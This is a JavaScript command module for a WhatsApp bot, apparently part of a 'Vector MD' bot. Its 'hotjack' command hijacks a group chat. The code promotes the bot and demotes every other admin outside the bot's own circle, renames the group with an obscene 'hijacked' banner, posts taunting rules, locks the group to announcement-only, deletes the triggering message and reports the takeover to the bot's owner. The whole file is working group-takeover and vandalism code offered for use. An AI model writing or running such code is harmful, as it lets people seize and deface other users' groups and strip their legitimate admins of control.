const { isPaired, getNum } = require("../../lib/auth")
const config = require("../../lib/vconfig")
const OWNER_JID = config.ownerNumber + "@s.whatsapp.net"
module.exports = {
  name: "hotjack",
  async execute(sock, msg, args, sender) {
    const gid = msg.key.remoteJid
    if (!gid.endsWith("@g.us")) return
    if (!isPaired(sender)) return sock.sendMessage(gid, { text: "❌ Paired users only!" })
    const botId    = sock.user.id.replace(/:\d+@/, "@")
    const ownerNum = config.ownerNumber
    const senderNum = getNum(sender)
    try {
      await sock.groupParticipantsUpdate(gid, [botId], "promote").catch(() => {})
      await new Promise(r => setTimeout(r, 1500))
      const meta = await sock.groupMetadata(gid)
      // Demote ALL admins except: bot, owner, sender (who gave the command), paired users
      const todemote = meta.participants.filter(p => {
        const pNum = getNum(p.id)
        return p.admin &&
               pNum !== getNum(botId) &&
               pNum !== ownerNum &&
               pNum !== senderNum &&
               !isPaired(p.id)  // don't touch other paired users either
      }).map(p => p.id)
      if (todemote.length) {
        await sock.groupParticipantsUpdate(gid, todemote, "demote").catch(() => {})
        await new Promise(r => setTimeout(r, 500))
      }
      // Promote owner if present in group
      const ownerInGrp = meta.participants.find(p => getNum(p.id) === ownerNum)
      if (ownerInGrp && !ownerInGrp.admin) {
        await sock.groupParticipantsUpdate(gid, [OWNER_JID], "promote").catch(() => {})
      }
      // Brand the group
      await sock.groupUpdateSubject(gid, "ꜰᴜᴄᴋᴇᴅ ʙʏ ᴠᴇᴄᴛᴏʀ ᴍᴅ 🪬").catch(() => {})
      await new Promise(r => setTimeout(r, 500))
      await sock.groupUpdateDescription(gid,
        "┏━━「 ʜɪᴊᴀᴄᴋᴇᴅ 」━━┓\n┃ 1. Only CHAD FDEV rules.\n┃ 2. Beg for mercy in DM.\n┃ 3. Group sealed.\n┗━━━━━━━━━━━━━━┛"
      ).catch(() => {})
      await sock.groupSettingUpdate(gid, "announcement").catch(() => {})
      await sock.groupSettingUpdate(gid, "locked").catch(() => {})
      await sock.sendMessage(gid, { delete: msg.key }).catch(() => {})
      await sock.sendMessage(OWNER_JID, { text: "🔥 Hotjack done!\n\nGroup: *" + meta.subject + "*\nDemoted: " + todemote.length + " admins\n🔒 Group locked" }).catch(() => {})
    } catch(e) {
      await sock.sendMessage(OWNER_JID, { text: "❌ Hotjack fail: " + e.message }).catch(() => {})
    }
  }
}
